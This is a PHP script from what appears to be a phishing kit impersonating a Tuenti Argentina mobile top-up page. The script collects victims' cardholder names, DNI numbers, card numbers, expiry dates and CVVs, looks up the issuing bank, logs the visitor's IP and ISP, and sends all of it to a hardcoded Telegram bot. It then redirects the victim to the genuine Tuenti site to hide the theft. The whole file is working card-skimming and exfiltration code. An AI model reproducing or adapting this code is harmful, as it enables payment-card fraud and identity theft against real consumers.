<?php

$mensaje .= "Nombre titular: ".$_POST["titular"]."\n\n"; 
$mensaje .= "DNI: ".$_POST["DNI"]."\n\n";
$mensaje .= "\n\n>> TARJETA <<\n\n";
$mensaje .= "Tarjeta: ".$_POST["CC"]."\n\n"; 
$mensaje .= "Mes: ".$_POST["mes"]."\n\n"; 
$mensaje .= "Año: ".$_POST["año"]."\n\n"; 
$mensaje .= "CVV: ".$_POST["CVV"]."\n\n";



	$filter = base64_encode($filter);
	$mensaje .= "\n\n>> Datos de tarjeta <<\n";
	$bin = substr(str_replace(" ", "", $_POST["CC"]), 0, 6);
	$result = file_get_contents("https://lookup.binlist.net/".$bin);
	$result = json_decode($result, true);
	if(isset($result["type"])){
		$mensaje .= "Tipo: ".$result["type"]."\n";
	}
	else {
		$mensaje .= "Tipo: No encontrado\n";
	}
	if(isset($result["brand"])){
		$mensaje .= "Marca: ".$result["brand"]."\n";
	}
	else {
		$mensaje .= "Marca: No encontrado\n";
	}
	if(isset($result["scheme"])){
		$mensaje .= "Esquema: ".$result["scheme"]."\n";
	}
	else {
		$mensaje .= "Esquema: No encontrado\n";
	}
	if(isset($result["country"]["name"])){
		$mensaje .= "Pais: ".$result["country"]["name"]."\n";
	}
	else {
		$mensaje .= "Pais: No encontrado\n";
	}
	if(isset($result["bank"]["name"])){
		$mensaje .= "Banco: ".$result["bank"]["name"]."\n";
	}
	else {
		$mensaje .= "Banco: No encontrado\n";
	}
	if(isset($result["bank"]["url"])){
		$mensaje .= "Url: ".$result["bank"]["url"]."\n";
	}
	else {
		$mensaje .= "Url: No encontrado\n";
	}
	if(isset($result["bank"]["phone"])){
		$mensaje .= "Telefono: ".$result["bank"]["phone"]."\n";
	}
	else {
		$mensaje .= "Telefono: No encontrado\n";
	}
	if(isset($result["bank"]["city"])){
		$mensaje .= "Ciudad: ".$result["bank"]["city"]."\n";
	}
	else {
		$mensaje .= "Ciudad: No encontrado\n";
	}
	include("config.php");
	$ip = getenv("REMOTE_ADDR");
	$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	define('BOT_TOKEN', $bottoken);
	define('CHAT_ID', $chatid);
	define('API_URL', 'https://api.telegram.org/bot5977556124:AAEazWuW7Bujg2xsWqvalzWoQey1bPQh-gU/');
	function enviar_telegram($msj){
		$queryArray = [
			'chat_id' => 5912398476,
			'text' => $msj,
		];
		$url = 'https://api.telegram.org/bot5977556124:AAEazWuW7Bujg2xsWqvalzWoQey1bPQh-gU/sendMessage?'. http_build_query($queryArray);
		$result = file_get_contents($url);
	}
	$file_name = 'data/'.$ip.'.db';
	$read_data = fopen($file_name, "a+");
	function enviar(){
		global $telegram_send, $file_save, $email_send, $mensaje, $ip, $isp;
		if($telegram_send){
			enviar_telegram(">> RECARGAS TUENTI <<\n\n>> DATOS DE CONEXIÓN <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
		
		}
	}
	if($read_data){
		$data = fgets($read_data);
		$data = explode(";", $data);
		if(!(in_array($filter, $data))){
			fwrite($read_data, $filter.";");
			fclose($read_data);
			enviar();
		}
	}
	else {
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar();
	}
header("location: https://www.tuenti.com.ar");
?>